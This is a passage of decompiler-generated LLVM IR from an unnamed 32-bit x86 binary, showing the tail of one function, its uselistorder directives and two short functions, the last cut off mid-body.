  %v1_804f5b9 = add i32 %v0_804f5af, 8
  %v2_804f5b9 = inttoptr i32 %v1_804f5b9 to i32*
  store i32 16, i32* %v2_804f5b9, align 4
  %v0_804f5bb = load i32, i32* %eax.global-to-local, align 4
  %v2_804f5bb = add i32 %v0_804f5af, 4
  %v3_804f5bb = inttoptr i32 %v2_804f5bb to i32*
  store i32 %v0_804f5bb, i32* %v3_804f5bb, align 4
  %v0_804f5bc = load i32, i32* @ebp, align 4
  %v3_804f5bc = inttoptr i32 %v0_804f5af to i32*
  store i32 %v0_804f5bc, i32* %v3_804f5bc, align 4
  %v3_804f5bd = call i32 @function_805083c(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804f5c2 = load i32, i32* @esp, align 4
  %v1_804f5c2 = add i32 %v0_804f5c2, 16
  %v1_804f5c5 = add i32 %v3_804f5bd, 1
  %v8_804f5c5 = icmp eq i32 %v1_804f5c5, 0
  store i32 %v1_804f5c5, i32* %eax.global-to-local, align 4
  %v1_804f5c6 = icmp eq i1 %v8_804f5c5, false
  br i1 %v1_804f5c6, label %dec_label_pc_804f5dd, label %dec_label_pc_804f5cb

dec_label_pc_804f5cb:                             ; preds = %dec_label_pc_804f55f, %dec_label_pc_804f5dd
  %storemerge4.in = phi i32 [ %v0_804f688, %dec_label_pc_804f5dd ], [ %v0_804f5c2, %dec_label_pc_804f55f ]
  %v0_804f5cb = load i32, i32* @ebp, align 4
  %v3_804f5cb = inttoptr i32 %storemerge4.in to i32*
  store i32 %v0_804f5cb, i32* %v3_804f5cb, align 4
  %v1_804f5cc = call i32 @function_8050233(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804f5cc, i32* @eax, align 4
  %v0_804f5d1 = load i32, i32* @esp, align 4
  %v1_804f5d1 = inttoptr i32 %v0_804f5d1 to i32*
  store i32 0, i32* %v1_804f5d1, align 4
  %v1_804f5d8 = call i32 @function_8051d53(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804f5d8, i32* %eax.global-to-local, align 4
  %v0_804f5dd.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804f5dd

dec_label_pc_804f5dd:                             ; preds = %dec_label_pc_804f55f, %dec_label_pc_804f5cb
  %v0_804f5dd = phi i32 [ %v1_804f5c2, %dec_label_pc_804f55f ], [ %v0_804f5dd.pre, %dec_label_pc_804f5cb ]
  %v1_804f5dd = add i32 %v0_804f5dd, 1864
  %v2_804f5dd = inttoptr i32 %v1_804f5dd to i8*
  store i8 0, i8* %v2_804f5dd, align 1
  %v0_804f5e5 = load i32, i32* @esp, align 4
  %v1_804f5e5 = add i32 %v0_804f5e5, -4
  %v2_804f5e5 = inttoptr i32 %v1_804f5e5 to i32*
  store i32 16384, i32* %v2_804f5e5, align 4
  %v1_804f5ea = add i32 %v0_804f5e5, -8
  %v2_804f5ea = inttoptr i32 %v1_804f5ea to i32*
  store i32 1, i32* %v2_804f5ea, align 4
  %v1_804f5ec = add i32 %v0_804f5e5, 1864
  store i32 %v1_804f5ec, i32* %eax.global-to-local, align 4
  %v2_804f5f3 = add i32 %v0_804f5e5, -12
  %v3_804f5f3 = inttoptr i32 %v2_804f5f3 to i32*
  store i32 %v1_804f5ec, i32* %v3_804f5f3, align 4
  %v0_804f5f4 = load i32, i32* @ebp, align 4
  %v2_804f5f4 = add i32 %v0_804f5e5, -16
  %v3_804f5f4 = inttoptr i32 %v2_804f5f4 to i32*
  store i32 %v0_804f5f4, i32* %v3_804f5f4, align 4
  %v0_804f5f5 = call i32 @function_8050966()
  %v0_804f5fa = load i32, i32* @esp, align 4
  %v1_804f5fa = add i32 %v0_804f5fa, -4
  %v2_804f5fa = inttoptr i32 %v1_804f5fa to i32*
  store i32 16384, i32* %v2_804f5fa, align 4
  %v1_804f5ff = add i32 %v0_804f5fa, -8
  %v2_804f5ff = inttoptr i32 %v1_804f5ff to i32*
  store i32 4, i32* %v2_804f5ff, align 4
  %v1_804f601 = add i32 %v0_804f5fa, 1888
  store i32 %v1_804f601, i32* %eax.global-to-local, align 4
  %v2_804f608 = add i32 %v0_804f5fa, -12
  %v3_804f608 = inttoptr i32 %v2_804f608 to i32*
  store i32 %v1_804f601, i32* %v3_804f608, align 4
  %v0_804f609 = load i32, i32* @ebp, align 4
  %v2_804f609 = add i32 %v0_804f5fa, -16
  %v3_804f609 = inttoptr i32 %v2_804f609 to i32*
  store i32 %v0_804f609, i32* %v3_804f609, align 4
  %v0_804f60a = call i32 @function_8050966()
  %v0_804f60f = load i32, i32* @esp, align 4
  %v1_804f612 = add i32 %v0_804f60f, 28
  %v2_804f612 = inttoptr i32 %v1_804f612 to i32*
  store i32 16384, i32* %v2_804f612, align 4
  %v1_804f617 = add i32 %v0_804f60f, 24
  %v2_804f617 = inttoptr i32 %v1_804f617 to i32*
  store i32 2, i32* %v2_804f617, align 4
  %v1_804f619 = add i32 %v0_804f60f, 1914
  store i32 %v1_804f619, i32* %eax.global-to-local, align 4
  %v2_804f620 = add i32 %v0_804f60f, 20
  %v3_804f620 = inttoptr i32 %v2_804f620 to i32*
  store i32 %v1_804f619, i32* %v3_804f620, align 4
  %v0_804f621 = load i32, i32* @ebp, align 4
  %v2_804f621 = add i32 %v0_804f60f, 16
  %v3_804f621 = inttoptr i32 %v2_804f621 to i32*
  store i32 %v0_804f621, i32* %v3_804f621, align 4
  %v0_804f622 = call i32 @function_8050966()
  store i32 %v0_804f622, i32* %eax.global-to-local, align 4
  %v0_804f627 = load i32, i32* @esp, align 4
  %v1_804f627 = add i32 %v0_804f627, -4
  %v2_804f627 = inttoptr i32 %v1_804f627 to i32*
  store i32 16384, i32* %v2_804f627, align 4
  %v1_804f62c = add i32 %v0_804f627, -8
  %v2_804f62c = inttoptr i32 %v1_804f62c to i32*
  store i32 1, i32* %v2_804f62c, align 4
  %v1_804f62e = add i32 %v0_804f627, 52
  %v2_804f62e = inttoptr i32 %v1_804f62e to i32*
  %v3_804f62e = load i32, i32* %v2_804f62e, align 4
  %v1_804f632 = add i32 %v3_804f62e, 12
  store i32 %v1_804f632, i32* %eax.global-to-local, align 4
  %v2_804f635 = add i32 %v0_804f627, -12
  %v3_804f635 = inttoptr i32 %v2_804f635 to i32*
  store i32 %v1_804f632, i32* %v3_804f635, align 4
  %v0_804f636 = load i32, i32* @ebp, align 4
  %v2_804f636 = add i32 %v0_804f627, -16
  %v3_804f636 = inttoptr i32 %v2_804f636 to i32*
  store i32 %v0_804f636, i32* %v3_804f636, align 4
  %v0_804f637 = call i32 @function_8050966()
  %v0_804f63c = load i32, i32* @esp, align 4
  %v1_804f63f = add i32 %v0_804f63c, 28
  %v2_804f63f = inttoptr i32 %v1_804f63f to i32*
  store i32 16384, i32* %v2_804f63f, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804f646 = add i32 %v0_804f63c, 68
  %v2_804f646 = inttoptr i32 %v1_804f646 to i32*
  %v3_804f646 = load i32, i32* %v2_804f646, align 4
  store i32 %v3_804f646, i32* %edx.global-to-local, align 4
  %v1_804f64a = add i32 %v3_804f646, 12
  %v2_804f64a = inttoptr i32 %v1_804f64a to i8*
  %v3_804f64a = load i8, i8* %v2_804f64a, align 1
  %v4_804f64a = zext i8 %v3_804f64a to i32
  store i32 %v4_804f64a, i32* %eax.global-to-local, align 4
  %v2_804f64d = add i32 %v0_804f63c, 24
  %v3_804f64d = inttoptr i32 %v2_804f64d to i32*
  store i32 %v4_804f64a, i32* %v3_804f64d, align 4
  %v0_804f64e = load i32, i32* %edx.global-to-local, align 4
  %v1_804f64e = inttoptr i32 %v0_804f64e to i32*
  %v2_804f64e = load i32, i32* %v1_804f64e, align 4
  store i32 %v2_804f64e, i32* %eax.global-to-local, align 4
  %v2_804f650 = add i32 %v0_804f63c, 20
  %v3_804f650 = inttoptr i32 %v2_804f650 to i32*
  store i32 %v2_804f64e, i32* %v3_804f650, align 4
  %v0_804f651 = load i32, i32* @ebp, align 4
  %v2_804f651 = add i32 %v0_804f63c, 16
  %v3_804f651 = inttoptr i32 %v2_804f651 to i32*
  store i32 %v0_804f651, i32* %v3_804f651, align 4
  %v0_804f652 = call i32 @function_8050966()
  store i32 %v0_804f652, i32* %eax.global-to-local, align 4
  %v0_804f657 = load i32, i32* @esp, align 4
  %v1_804f657 = add i32 %v0_804f657, -4
  %v2_804f657 = inttoptr i32 %v1_804f657 to i32*
  store i32 16384, i32* %v2_804f657, align 4
  %v1_804f65c = add i32 %v0_804f657, -8
  %v2_804f65c = inttoptr i32 %v1_804f65c to i32*
  store i32 1, i32* %v2_804f65c, align 4
  %v1_804f65e = add i32 %v0_804f657, 52
  %v2_804f65e = inttoptr i32 %v1_804f65e to i32*
  %v3_804f65e = load i32, i32* %v2_804f65e, align 4
  %v1_804f662 = add i32 %v3_804f65e, 13
  store i32 %v1_804f662, i32* %eax.global-to-local, align 4
  %v2_804f665 = add i32 %v0_804f657, -12
  %v3_804f665 = inttoptr i32 %v2_804f665 to i32*
  store i32 %v1_804f662, i32* %v3_804f665, align 4
  %v0_804f666 = load i32, i32* @ebp, align 4
  %v2_804f666 = add i32 %v0_804f657, -16
  %v3_804f666 = inttoptr i32 %v2_804f666 to i32*
  store i32 %v0_804f666, i32* %v3_804f666, align 4
  %v0_804f667 = call i32 @function_8050966()
  %v0_804f66c = load i32, i32* @esp, align 4
  %v1_804f66f = add i32 %v0_804f66c, 28
  %v2_804f66f = inttoptr i32 %v1_804f66f to i32*
  store i32 16384, i32* %v2_804f66f, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804f676 = add i32 %v0_804f66c, 68
  %v2_804f676 = inttoptr i32 %v1_804f676 to i32*
  %v3_804f676 = load i32, i32* %v2_804f676, align 4
  store i32 %v3_804f676, i32* %ecx.global-to-local, align 4
  %v1_804f67a = add i32 %v3_804f676, 13
  %v2_804f67a = inttoptr i32 %v1_804f67a to i8*
  %v3_804f67a = load i8, i8* %v2_804f67a, align 1
  %v4_804f67a = zext i8 %v3_804f67a to i32
  store i32 %v4_804f67a, i32* %eax.global-to-local, align 4
  %v2_804f67d = add i32 %v0_804f66c, 24
  %v3_804f67d = inttoptr i32 %v2_804f67d to i32*
  store i32 %v4_804f67a, i32* %v3_804f67d, align 4
  %v0_804f67e = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f67e = add i32 %v0_804f67e, 4
  %v2_804f67e = inttoptr i32 %v1_804f67e to i32*
  %v3_804f67e = load i32, i32* %v2_804f67e, align 4
  store i32 %v3_804f67e, i32* %eax.global-to-local, align 4
  %v2_804f681 = add i32 %v0_804f66c, 20
  %v3_804f681 = inttoptr i32 %v2_804f681 to i32*
  store i32 %v3_804f67e, i32* %v3_804f681, align 4
  %v0_804f682 = load i32, i32* @ebp, align 4
  %v2_804f682 = add i32 %v0_804f66c, 16
  %v3_804f682 = inttoptr i32 %v2_804f682 to i32*
  store i32 %v0_804f682, i32* %v3_804f682, align 4
  %v0_804f683 = call i32 @function_8050966()
  store i32 %v0_804f683, i32* %eax.global-to-local, align 4
  %v0_804f688 = load i32, i32* @esp, align 4
  %v1_804f688 = inttoptr i32 %v0_804f688 to i32*
  %v2_804f688 = load i32, i32* %v1_804f688, align 4
  store i32 %v2_804f688, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f5cb

; uselistorder directives
  uselistorder i32 %v0_804f688, { 1, 0 }
  uselistorder i32 %v4_804f67a, { 1, 0 }
  uselistorder i32 %v4_804f64a, { 1, 0 }
  uselistorder i32 %v0_804f58b, { 0, 2, 1 }
  uselistorder i64 %v8_804f579, { 1, 0 }
  uselistorder i32 %v1_804f56c, { 1, 0 }
  uselistorder i32 %v0_804f547, { 0, 2, 1 }
  uselistorder i32* %v2_804e5a8, { 1, 0 }
  uselistorder i32 %v0_804e9cc, { 1, 0 }
  uselistorder i32 %v5_804ea61, { 1, 0 }
  uselistorder i32 %v4_804ea61.be, { 2, 1, 0 }
  uselistorder i32 %v0_804ea61, { 2, 1, 0 }
  uselistorder i32 %v0_804f3d3, { 1, 0, 2 }
  uselistorder i32 %v3_804f3a1, { 2, 1, 0 }
  uselistorder i32 %v0_804f39e, { 0, 2, 1 }
  uselistorder i32 %v0_804f378, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v0_804f273, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v0_804f247, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v0_804f18e, { 1, 2, 0 }
  uselistorder i32 %v0_804f0f0, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v0_804f05c, { 1, 2, 0 }
  uselistorder i32 %v0_804f48b, { 1, 0 }
  uselistorder i32 %v2_804ef84, { 1, 0, 2 }
  uselistorder i32 %v1_804ef81, { 1, 0, 2 }
  uselistorder i32 %v0_804ef7a, { 1, 2, 0 }
  uselistorder i32 %v9_804ee6b, { 1, 0 }
  uselistorder i32 %v1_804ee64, { 0, 3, 2, 1 }
  uselistorder i32 %v1_804ee3e, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v9_804edb0, { 1, 0 }
  uselistorder i32 %v1_804eda9, { 0, 3, 2, 1 }
  uselistorder i32 %v1_804ed83, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v5_804ed56, { 1, 2, 0 }
  uselistorder i32 %v4_804ed56, { 1, 2, 0, 3 }
  uselistorder i32 %v3_804ed51, { 3, 2, 0, 1, 4, 5, 6 }
  uselistorder i32 %v0_804f32b, { 1, 0 }
  uselistorder i32* %v1_804f35b, { 2, 0, 1 }
  uselistorder i32 %v0_804ece6, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v9_804ec40, { 1, 0 }
  uselistorder i32 %v1_804ec39, { 0, 3, 2, 1 }
  uselistorder i32 %v1_804ec13, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_804ec02, { 2, 1, 0 }
  uselistorder i32 %v9_804ebd1, { 1, 0 }
  uselistorder i32 %v0_804f182, { 0, 2, 1 }
  uselistorder i32 %v1_804ebbd, { 2, 1, 0 }
  uselistorder i32 %v9_804eb8c, { 1, 0 }
  uselistorder i32 %v0_804f050, { 0, 2, 1 }
  uselistorder i32 %v1_804eb74, { 2, 1, 0 }
  uselistorder i32 %v9_804eb4c, { 1, 0 }
  uselistorder i32 %v0_804f0c9, { 0, 2, 1 }
  uselistorder i32 %v1_804eb38, { 2, 1, 0 }
  uselistorder i32 %v9_804eb07, { 1, 0 }
  uselistorder i32 %v0_804f1ff, { 0, 2, 1 }
  uselistorder i32 %v5_804eadd, { 1, 0 }
  uselistorder i32 %v4_804eadd, { 0, 2, 1 }
  uselistorder i8* %v2_804eaa5, { 1, 0, 2 }
  uselistorder i8* %v1_804ea93, { 1, 0, 2 }
  uselistorder i32 %v1_804ea70, { 1, 0, 2 }
  uselistorder i32 %v1_804ef00, { 4, 3, 0, 1, 2, 5 }
  uselistorder i32 %v3_804ea42, { 1, 0 }
  uselistorder i32 %v0_804ea42, { 0, 13, 1, 11, 2, 10, 3, 12, 4, 9, 5, 8, 6, 7, 14 }
  uselistorder i32 %v1_804ea2d, { 0, 2, 1 }
  uselistorder i32 %v0_804ea29, { 1, 0 }
  uselistorder i32 %v0_804ea10, { 1, 4, 0, 2, 3, 5 }
  uselistorder i32 %v0_804e9a3, { 0, 2, 3, 1 }
  uselistorder i32 %v1_804e9a2, { 1, 0, 2 }
  uselistorder i16 %v1_804e9ae, { 1, 0 }
  uselistorder i64 %v8_804e98f, { 1, 0 }
  uselistorder i32 %v0_804e917, { 2, 0, 1 }
  uselistorder i32 %v1_804e914, { 1, 0 }
  uselistorder i32 %v2_804e911, { 1, 0 }
  uselistorder i32 %v3_804e905, { 1, 0, 2, 4, 3 }
  uselistorder i32 %v1_804e8ec, { 1, 0 }
  uselistorder i32 %v0_804e8ec, { 1, 0, 2, 3 }
  uselistorder i32 %v1_804e8c7, { 1, 0 }
  uselistorder i32 %v2_804e8c4, { 1, 0 }
  uselistorder i32 %v0_804e8c2, { 1, 0 }
  uselistorder i32 %v2_804e878, { 1, 0 }
  uselistorder i32 %v2_804e835, { 1, 0 }
  uselistorder i32 %v3_804e832, { 1, 0, 2, 3 }
  uselistorder i1 %v9_804e7c2, { 1, 0 }
  uselistorder i32 %v1_804e7c2, { 1, 0 }
  uselistorder i32 %v3_804e7bf, { 1, 0, 2 }
  uselistorder i32 %v2_804e7bd, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v1_804e7a2, { 1, 0 }
  uselistorder i32 %v0_804e7a2, { 1, 0, 2, 3 }
  uselistorder i32 %v2_804e78d, { 1, 0 }
  uselistorder i32 %v3_804e78a, { 1, 0, 2, 3 }
  uselistorder i32 %v2_804e827, { 1, 0 }
  uselistorder i32 %v1_804e824, { 2, 1, 0 }
  uselistorder i32 %v1_804e728, { 1, 0 }
  uselistorder i32 %v1_804e71d, { 1, 0 }
  uselistorder i32 %v0_804e71d, { 1, 0 }
  uselistorder i32 %v0_804e726, { 0, 3, 2, 1 }
  uselistorder i32 %v1_804e6fa, { 1, 0 }
  uselistorder i32 %v0_804e6fa, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v6_804e6ec, { 1, 0, 2 }
  uselistorder i32 %v4_804e6af, { 2, 1, 0 }
  uselistorder i32 %v3_804e67e, { 1, 0, 2 }
  uselistorder i32 %v0_804e5c2, { 0, 2, 1 }
  uselistorder i32 %v0_804e5b9, { 0, 3, 1, 2 }
  uselistorder i8 %v1_804e592, { 1, 0 }
  uselistorder i32 %v0_804e59b, { 1, 0 }
  uselistorder i8 %v1_804e56d, { 1, 0 }
  uselistorder i8 %v2_804e547, { 1, 5, 6, 0, 3, 4, 2 }
  uselistorder i32 %v2_804e53e, { 10, 4, 9, 6, 1, 0, 2, 3, 7, 5, 8 }
  uselistorder i32 %v5_804e53c, { 0, 5, 4, 7, 6, 2, 3, 1 }
  uselistorder i32 %v1_804e536, { 3, 0, 1, 2 }
  uselistorder i32 %v1_804e531, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804e4e5, { 1, 0 }
  uselistorder i32 %v0_804e435, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v0_804e430, { 1, 0 }
  uselistorder i32 %v1_804e40d, { 2, 1, 0 }
  uselistorder i32 %v0_804e3f5, { 3, 5, 2, 4, 0, 1 }
  uselistorder i32 %v0_804e320, { 2, 0, 1 }
  uselistorder i32 %v0_804e2e4, { 1, 0, 2 }
  uselistorder i32* %edx.global-to-local, { 37, 38, 6, 7, 8, 59, 9, 10, 11, 12, 28, 29, 30, 56, 18, 22, 23, 24, 25, 26, 20, 34, 35, 36, 60, 58, 0, 1, 2, 3, 4, 5, 13, 14, 15, 16, 17, 19, 21, 27, 57, 31, 32, 33, 52, 53, 54, 55, 39, 40, 43, 41, 42, 44, 45, 46, 47, 48, 49, 50, 51 }
  uselistorder i32* %ecx.global-to-local, { 13, 14, 2, 11, 12, 3, 9, 35, 36, 6, 7, 8, 37, 0, 1, 4, 5, 10, 31, 32, 33, 34, 16, 17, 15, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1 }
  uselistorder i32* %eax.global-to-local, { 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 24, 25, 26, 27, 28, 29, 32, 30, 31, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 46, 161, 162, 127, 163, 164, 245, 128, 129, 268, 269, 270, 271, 272, 47, 48, 51, 49, 50, 52, 53, 54, 55, 56, 106, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 257, 258, 259, 260, 261, 262, 263, 264, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 95, 96, 97, 98, 99, 100, 101, 102, 103, 165, 166, 167, 168, 248, 169, 170, 171, 172, 173, 274, 275, 276, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 149, 150, 151, 152, 153, 58, 59, 60, 61, 62, 63, 57, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 93, 94, 104, 105, 125, 126, 265, 266, 154, 155, 156, 157, 158, 273, 159, 160, 267, 174, 175, 176, 177, 178, 180, 246, 247, 249, 250, 251, 252, 253, 254, 255, 195, 196, 243, 244, 179, 256, 194, 197, 198, 199, 202, 200, 201, 203, 205, 206, 207, 208, 212, 214, 213, 209, 210, 211, 204, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 45, 240, 242, 241, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239 }
  uselistorder i32 ()* @function_804fdc0, { 4, 1, 0, 2, 3 }
  uselistorder i32 1880, { 11, 9, 14, 0, 1, 5, 6, 13, 2, 3, 4, 15, 7, 8, 12, 10 }
  uselistorder i32 ()* @function_804f6c0, { 13, 5, 4, 12, 7, 3, 2, 1, 0, 9, 6, 8, 15, 14, 11, 10 }
  uselistorder i32 ()* @function_804f690, { 9, 8, 7, 1, 0, 4, 2, 3, 11, 10, 6, 5 }
  uselistorder i32 1888, { 4, 2, 3, 0, 1 }
  uselistorder i32 ()* @function_804f740, { 8, 7, 1, 0, 4, 2, 3, 10, 9, 6, 5 }
  uselistorder i8 58, { 9, 0, 8, 1, 7, 2, 3, 4, 5, 6 }
  uselistorder i32 ()* @function_8050966, { 7, 6, 5, 4, 3, 2, 20, 1, 0, 10, 9, 16, 15, 12, 11, 14, 13, 24, 23, 22, 21, 18, 17, 8, 19 }
  uselistorder i8 -5, { 2, 3, 0, 1 }
  uselistorder i8 -3, { 4, 5, 6, 3, 0, 1, 2 }
  uselistorder i32 1864, { 0, 2, 3, 1, 4 }
  uselistorder i32 1872, { 1, 0, 2 }
  uselistorder i32 1572, { 1, 0, 2 }
  uselistorder i32 1700, { 1, 0, 2 }
  uselistorder i32 ()* @function_804ddf0, { 2, 3, 1, 0 }
  uselistorder i32 288, { 0, 1, 3, 4, 2 }
  uselistorder i32 -28, { 1, 0, 2 }
  uselistorder i32 -24, { 1, 0, 2 }
  uselistorder i32 -20, { 1, 0, 2 }
  uselistorder i8 31, { 1, 2, 3, 0 }
  uselistorder i8 -1, { 3, 4, 5, 0, 1, 2 }
  uselistorder i8 10, { 1, 2, 3, 0 }
  uselistorder i8 127, { 1, 0 }
  uselistorder i32 (i32)* @function_804d6e0, { 4, 0, 2, 1, 3 }
  uselistorder i32 1844, { 1, 0, 2 }
  uselistorder i16* @global_var_80543b6.13, { 1, 0 }
  uselistorder i8 -58, { 1, 0 }
  uselistorder i8 -87, { 2, 1, 0 }
  uselistorder i8 100, { 1, 0 }
  uselistorder i32 1868, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804f5dd, { 1, 0 }
  uselistorder label %dec_label_pc_804f5cb, { 1, 0 }
  uselistorder label %dec_label_pc_804f46b, { 1, 0 }
  uselistorder label %dec_label_pc_804e9cc.backedge, { 21, 7, 15, 10, 14, 0, 12, 1, 3, 16, 4, 5, 18, 6, 8, 19, 9, 17, 11, 20, 13, 2 }
  uselistorder label %dec_label_pc_804f3e0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f2c7, { 1, 0 }
  uselistorder label %dec_label_pc_804f20b, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f138, { 1, 0 }
  uselistorder label %dec_label_pc_804f0d5, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f038, { 2, 7, 4, 6, 5, 0, 1, 3, 8 }
  uselistorder label %dec_label_pc_804efc6, { 1, 0 }
  uselistorder label %dec_label_pc_804ee79, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804ee55, { 1, 0 }
  uselistorder label %dec_label_pc_804edbe, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804ed9a, { 1, 0 }
  uselistorder label %dec_label_pc_804ed60, { 1, 0 }
  uselistorder label %dec_label_pc_804ed51, { 3, 4, 9, 6, 8, 7, 0, 1, 2, 11, 5, 10 }
  uselistorder label %dec_label_pc_804ec4e, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804ec2a, { 1, 0 }
  uselistorder label %dec_label_pc_804ebd1, { 1, 0 }
  uselistorder label %dec_label_pc_804eb8c, { 1, 0 }
  uselistorder label %dec_label_pc_804eb4c, { 1, 0 }
  uselistorder label %dec_label_pc_804eb07, { 1, 0 }
  uselistorder label %dec_label_pc_804eae3, { 1, 2, 5, 3, 4, 6, 0 }
  uselistorder label %dec_label_pc_804eab8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804eaa5, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804ea93, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_804ea67, { 1, 0 }
  uselistorder label %dec_label_pc_804ea67.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804ea32, { 1, 0 }
  uselistorder label %dec_label_pc_804ea2d, { 1, 0 }
  uselistorder label %dec_label_pc_804e9eb, { 1, 0 }
  uselistorder label %dec_label_pc_804e9d7, { 1, 0 }
  uselistorder label %dec_label_pc_804e8dd, { 5, 6, 0, 7, 2, 3, 1, 4 }
  uselistorder label %dec_label_pc_804e8c2, { 1, 0 }
  uselistorder label %dec_label_pc_804e89a, { 1, 0 }
  uselistorder label %dec_label_pc_804e7c7, { 1, 0 }
  uselistorder label %dec_label_pc_804e793, { 3, 4, 0, 1, 5, 6, 2 }
  uselistorder label %dec_label_pc_804e746, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804e71d, { 1, 0 }
  uselistorder label %dec_label_pc_804e636, { 9, 1, 2, 3, 4, 5, 0, 6, 7, 8, 10 }
  uselistorder label %dec_label_pc_804e62b, { 1, 0 }
  uselistorder label %dec_label_pc_804e5cb, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804e5b0, { 1, 0 }
  uselistorder label %dec_label_pc_804e57b, { 1, 0 }
  uselistorder label %dec_label_pc_804e531, { 6, 7, 0, 1, 2, 5, 4, 3, 8 }
  uselistorder label %dec_label_pc_804e531.preheader, { 21, 17, 20, 16, 19, 15, 13, 14, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 18 }
  uselistorder label %dec_label_pc_804e37f, { 3, 0, 4, 1, 2 }
  uselistorder label %dec_label_pc_804e332, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_804e320, { 1, 2, 0 }
}

define i32 @function_804f690() local_unnamed_addr {
dec_label_pc_804f690:
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %v1_804f698 = icmp eq i32 %tmp, 0
  %v1_804f69a = mul i32 %tmp2, 8
  store i32 %v1_804f69a, i32* %edx.global-to-local, align 4
  br i1 %v1_804f698, label %dec_label_pc_804f6b3, label %dec_label_pc_804f6a9

dec_label_pc_804f6a9:                             ; preds = %dec_label_pc_804f690
  %v1_804f6a9 = add i32 %v1_804f69a, add (i32 ptrtoint (i32* @global_var_8054440.28 to i32), i32 4)
  %v2_804f6a9 = inttoptr i32 %v1_804f6a9 to i32*
  %v3_804f6a9 = load i32, i32* %v2_804f6a9, align 4
  %v1_804f6ac = urem i32 %v3_804f6a9, 65536
  %v2_804f6b1 = inttoptr i32 %tmp to i32*
  store i32 %v1_804f6ac, i32* %v2_804f6b1, align 4
  %v0_804f6b3.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f6b3

dec_label_pc_804f6b3:                             ; preds = %dec_label_pc_804f690, %dec_label_pc_804f6a9
  %v0_804f6b3 = phi i32 [ %v1_804f69a, %dec_label_pc_804f690 ], [ %v0_804f6b3.pre, %dec_label_pc_804f6a9 ]
  %v1_804f6b3 = add i32 %v0_804f6b3, ptrtoint (i32* @global_var_8054440.28 to i32)
  %v2_804f6b3 = inttoptr i32 %v1_804f6b3 to i32*
  %v3_804f6b3 = load i32, i32* %v2_804f6b3, align 4
  ret i32 %v3_804f6b3

; uselistorder directives
  uselistorder label %dec_label_pc_804f6b3, { 1, 0 }
}

define i32 @function_804f6c0() local_unnamed_addr {
dec_label_pc_804f6c0:
  %ebp.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %stack_var_-44 = alloca i8, align 1
  %v4_804f6c9 = zext i8 %tmp to i32
  %v1_804f6cd = mul nuw nsw i32 %v4_804f6c9, 8
  %v2_804f6cd = add i32 %v1_804f6cd, ptrtoint (i32* @global_var_8054440.28 to i32)
  store i32 %v2_804f6cd, i32* %ecx.global-to-local, align 4
  %v0_804f6d4 = load i16, i16* @global_var_80542dc.29, align 2
  %v1_804f6d4 = sext i16 %v0_804f6d4 to i32
  %v1_804f6d9 = add i32 %v1_804f6cd, add (i32 ptrtoint (i32* @global_var_8054440.28 to i32), i32 4)
  %v2_804f6d9 = inttoptr i32 %v1_804f6d9 to i16*
  %v3_804f6d9 = load i16, i16* %v2_804f6d9, align 4
  %v4_804f6d9 = icmp eq i16 %v3_804f6d9, 0
  br i1 %v4_804f6d9, label %dec_label_pc_804f72a, label %dec_label_pc_804f6e0

dec_label_pc_804f6e0:                             ; preds = %dec_label_pc_804f6c0
  store i32 %v1_804f6d4, i32* %ebp.global-to-local, align 4
